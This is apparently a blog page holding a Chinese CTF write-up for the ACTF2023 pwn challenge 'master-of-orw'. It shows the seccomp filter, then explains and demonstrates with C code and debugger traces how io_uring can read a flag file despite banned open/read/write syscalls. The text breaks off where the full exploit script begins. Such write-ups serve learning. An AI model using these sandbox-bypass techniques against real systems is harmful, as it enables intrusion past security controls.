<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/01/ACTF2023/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/01/ACTF2023/" class="post-title-link" itemprop="url">ACTF2023</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-11-01 22:09:35 / Modified: 22:13:26" itemprop="dateCreated datePublished" datetime="2023-11-01T22:09:35+08:00">2023-11-01</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>23k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>20 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="master-of-orw"><a href="#master-of-orw" class="headerlink" title="master-of-orw"></a>master-of-orw</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">master-of-orw: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">9</span>ca858a89af65e342074ea6e69e1f20ddba93d11, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Full RELRO，NX，PIE</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x19</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x16</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x14</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x13</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x12</span> <span class="number">0x00</span> <span class="number">0x00000011</span>  <span class="keyword">if</span> (A == pread64) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x11</span> <span class="number">0x00</span> <span class="number">0x00000012</span>  <span class="keyword">if</span> (A == pwrite64) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x10</span> <span class="number">0x00</span> <span class="number">0x00000013</span>  <span class="keyword">if</span> (A == readv) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0011</span>: <span class="number">0x15</span> <span class="number">0x0f</span> <span class="number">0x00</span> <span class="number">0x00000014</span>  <span class="keyword">if</span> (A == writev) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0012</span>: <span class="number">0x15</span> <span class="number">0x0e</span> <span class="number">0x00</span> <span class="number">0x00000028</span>  <span class="keyword">if</span> (A == sendfile) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0013</span>: <span class="number">0x15</span> <span class="number">0x0d</span> <span class="number">0x00</span> <span class="number">0x0000002c</span>  <span class="keyword">if</span> (A == sendto) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0014</span>: <span class="number">0x15</span> <span class="number">0x0c</span> <span class="number">0x00</span> <span class="number">0x0000002e</span>  <span class="keyword">if</span> (A == sendmsg) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0015</span>: <span class="number">0x15</span> <span class="number">0x0b</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0016</span>: <span class="number">0x15</span> <span class="number">0x0a</span> <span class="number">0x00</span> <span class="number">0x00000101</span>  <span class="keyword">if</span> (A == openat) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0017</span>: <span class="number">0x15</span> <span class="number">0x09</span> <span class="number">0x00</span> <span class="number">0x00000127</span>  <span class="keyword">if</span> (A == preadv) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0018</span>: <span class="number">0x15</span> <span class="number">0x08</span> <span class="number">0x00</span> <span class="number">0x00000128</span>  <span class="keyword">if</span> (A == pwritev) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0019</span>: <span class="number">0x15</span> <span class="number">0x07</span> <span class="number">0x00</span> <span class="number">0x0000012f</span>  <span class="keyword">if</span> (A == name_to_handle_at) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0020</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00000130</span>  <span class="keyword">if</span> (A == open_by_handle_at) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0021</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000142</span>  <span class="keyword">if</span> (A == execveat) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0022</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000147</span>  <span class="keyword">if</span> (A == preadv2) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0023</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000148</span>  <span class="keyword">if</span> (A == pwritev2) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0024</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x000001ac</span>  <span class="keyword">if</span> (A == <span class="number">0x1ac</span>) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0025</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x000001b5</span>  <span class="keyword">if</span> (A == <span class="number">0x1b5</span>) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0026</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0027</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<p>执行 shellcode，但是有沙盒：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">code = mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Input your code&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, code, <span class="number">0x400</span>uLL);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Wish you a good journey&quot;</span>);</span><br><span class="line">box();</span><br><span class="line">((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))code)();</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>在 openat 和 open 都被 ban 了的情况下，只能使用 io_uring 来进行 ORW</p>
<p>io_uring（Unified Resource Gestion）是一种 Linux 内核中的新特性，它提供了一种高性能、低延迟的 I/O 调度机制</p>
<p>基于共享内存，io_uring 维护了两个与内核共享的队列：</p>
<ul>
<li>submit 队列：用于存储待提交的 I/O 请求 </li>
<li>completion 队列：用于存储 I/O 请求的完成状态</li>
</ul>
<p>submit 队列中的 I/O 请求与 completion 队列中的 I/O 完成事件之间也没有固定的对应关系，内核会根据 I/O 请求的类型、文件描述符、线程池等信息自动将 I/O 请求分配到合适的队列中 </p>
<ul>
<li>由于 submit / completion 队列属于用户态程序与内核的共享空间</li>
<li>内核只需要读取 submit 队列中的参数就可以执行相应的内核态函数，不需要执行系统调用</li>
<li>当数据执行完毕时，内核又会将返回数据写入 completion 队列</li>
</ul>
<p>先给出一个 io_uring ORW 的案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -o io_uring io_uring.c -static -luring -fno-stack-protector -no-pie -g</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;liburing.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QUEUE_DEPTH 1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;    </span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">io_uring</span> <span class="title">ring</span>;</span>    </span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqe</span>;</span>    </span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_cqe</span> *<span class="title">cqe</span>;</span>    </span><br><span class="line">   <span class="keyword">int</span> fd, ret;    </span><br><span class="line">   <span class="keyword">char</span> buffer[<span class="number">4096</span>]; </span><br><span class="line">   io_uring_queue_init(QUEUE_DEPTH, &amp;ring, <span class="number">0</span>);</span><br><span class="line">   sqe = io_uring_get_sqe(&amp;ring);    </span><br><span class="line">   io_uring_prep_openat(sqe, AT_FDCWD, <span class="string">&quot;./flag&quot;</span>, O_RDONLY, <span class="number">0</span>);    </span><br><span class="line">   io_uring_sqe_set_data(sqe, <span class="literal">NULL</span>);</span><br><span class="line">   ret = io_uring_submit(&amp;ring);    </span><br><span class="line">   ret = io_uring_wait_cqe(&amp;ring, &amp;cqe);   </span><br><span class="line">   fd = cqe-&gt;res;  </span><br><span class="line">   sqe = io_uring_get_sqe(&amp;ring);    </span><br><span class="line">   io_uring_prep_read(sqe, fd, buffer, <span class="keyword">sizeof</span>(buffer), <span class="number">0</span>);    </span><br><span class="line">   io_uring_sqe_set_data(sqe, <span class="literal">NULL</span>);</span><br><span class="line">   ret = io_uring_submit(&amp;ring);    </span><br><span class="line">   ret = io_uring_wait_cqe(&amp;ring, &amp;cqe);    </span><br><span class="line">   sqe = io_uring_get_sqe(&amp;ring);    </span><br><span class="line">   io_uring_prep_write(sqe, <span class="number">1</span>, buffer, <span class="built_in">strlen</span>(buffer), <span class="number">0</span>);    </span><br><span class="line">   io_uring_sqe_set_data(sqe, <span class="literal">NULL</span>);</span><br><span class="line">   ret = io_uring_submit(&amp;ring);    </span><br><span class="line">   ret = io_uring_wait_cqe(&amp;ring, &amp;cqe);    </span><br><span class="line">   io_uring_cqe_seen(&amp;ring, cqe);    </span><br><span class="line">   io_uring_queue_exit(&amp;ring);    </span><br><span class="line">   close(fd);    </span><br><span class="line">   sleep(<span class="number">1</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以进行单步调试，观察并记录上述代码的执行流程</p>
<p>io_uring_queue_init：核心初始化</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io_uring_queue_init(<span class="number">1u</span>, &amp;ring, <span class="number">0</span>); <span class="comment">/* 一次sys_unk_425,两次sys_mmap */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>sys_unk_425：初始化 io_uring 的系统调用</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x402aca</span> &lt;__io_uring_queue_init_params+<span class="number">90</span>&gt;     syscall  &lt;SYS_&lt;unk_425&gt;&gt;</span><br><span class="line">       rdi: <span class="number">0x1</span></span><br><span class="line">       rsi: <span class="number">0x7fffffffc9f0</span> ◂— <span class="number">0x0</span></span><br><span class="line">       rdx: <span class="number">0x0</span></span><br><span class="line">       r10: <span class="number">0x2</span></span><br></pre></td></tr></table></figure>
<ul>
<li>sys_mmap：创建 submit 队列 </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x401235</span> &lt;io_uring_queue_mmap+<span class="number">149</span>&gt;    syscall  &lt;SYS_mmap&gt;</span><br><span class="line">       addr: <span class="number">0x0</span></span><br><span class="line">       len: <span class="number">0x184</span></span><br><span class="line">       prot: <span class="number">0x3</span></span><br><span class="line">       flags: <span class="number">0x8001</span></span><br><span class="line">       fd: <span class="number">0x3</span> (anon_inode:[io_uring])</span><br><span class="line">       offset: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>sys_mmap：创建 completion 队列</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x4012c9</span> &lt;io_uring_queue_mmap+<span class="number">297</span>&gt;    syscall  &lt;SYS_mmap&gt;</span><br><span class="line">       addr: <span class="number">0x0</span></span><br><span class="line">       len: <span class="number">0x40</span></span><br><span class="line">       prot: <span class="number">0x3</span></span><br><span class="line">       flags: <span class="number">0x8001</span></span><br><span class="line">       fd: <span class="number">0x3</span> (anon_inode:[io_uring])</span><br><span class="line">       offset: <span class="number">0x10000000</span></span><br></pre></td></tr></table></figure>
<p>io_uring_get_sqe：获取 <code>io_uring_sqe</code> 结构体的指针（该结构体用于描述一个 submit 条目）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqe = io_uring_get_sqe(&amp;ring);</span><br></pre></td></tr></table></figure>
<p>io_uring_prep_openat / io_uring_prep_read / io_uring_prep_write：注册 open / read / write</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io_uring_prep_openat(sqe, <span class="number">-100</span>, <span class="string">&quot;./flag&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">io_uring_prep_read(sqe, fd, buffer, <span class="number">0x1000</span>u, <span class="number">0LL</span>);</span><br><span class="line">io_uring_prep_write(sqe, <span class="number">1</span>, buffer, len, <span class="number">0LL</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>将信息填写入 submit / completion 队列，核心函数为 io_uring_prep_rw</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x402473</span> &lt;io_uring_prep_rw+<span class="number">35</span>&gt;    mov    byte ptr [rax], dl</span><br><span class="line">  <span class="number">0x402475</span> &lt;io_uring_prep_rw+<span class="number">37</span>&gt;    mov    rax, qword ptr [rbp - <span class="number">0x10</span>]</span><br><span class="line">  <span class="number">0x402479</span> &lt;io_uring_prep_rw+<span class="number">41</span>&gt;    mov    byte ptr [rax + <span class="number">1</span>], <span class="number">0</span></span><br><span class="line">  <span class="number">0x40247d</span> &lt;io_uring_prep_rw+<span class="number">45</span>&gt;    mov    rax, qword ptr [rbp - <span class="number">0x10</span>]</span><br><span class="line">  <span class="number">0x402481</span> &lt;io_uring_prep_rw+<span class="number">49</span>&gt;    mov    word ptr [rax + <span class="number">2</span>], <span class="number">0</span></span><br><span class="line">  <span class="number">0x402487</span> &lt;io_uring_prep_rw+<span class="number">55</span>&gt;    mov    rax, qword ptr [rbp - <span class="number">0x10</span>]</span><br></pre></td></tr></table></figure>
<p>io_uring_submit：向内核提交注册信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret = io_uring_submit(&amp;ring);</span><br></pre></td></tr></table></figure>
<ul>
<li>sys_unk_426：提交注册信息的系统调用</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x40466b</span> &lt;io_uring_submit+<span class="number">123</span>&gt;    syscall  &lt;SYS_&lt;unk_426&gt;&gt;</span><br><span class="line">       rdi: <span class="number">0x3</span></span><br><span class="line">       rsi: <span class="number">0x1</span></span><br><span class="line">       rdx: <span class="number">0x0</span></span><br><span class="line">       r10: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>io_uring_wait_cqe：获取 <code>io_uring_cqe</code> 结构体的指针（该结构体用于描述一个 completion 条目）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret = io_uring_wait_cqe(&amp;ring, &amp;cqe);</span><br></pre></td></tr></table></figure>
<p>接下来就可以 IDA 分析二进制文件，提取出有效的汇编指令片段：</p>
<ul>
<li>shellcode 各个函数的汇编代码尽量和二进制文件一致</li>
<li>对于 io_uring_queue_init / io_uring_submit 函数需要保证系统调用的参数一致</li>
<li>对于 io_uring_prep_rw 则需要保证填写的数据一致</li>
<li>对于 io_uring_get_sqe / io_uring_wait_cqe 只需要提取基本的汇编代码即可</li>
<li>函数 io_uring_prep_read 可以被 mmap 替代</li>
</ul>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span 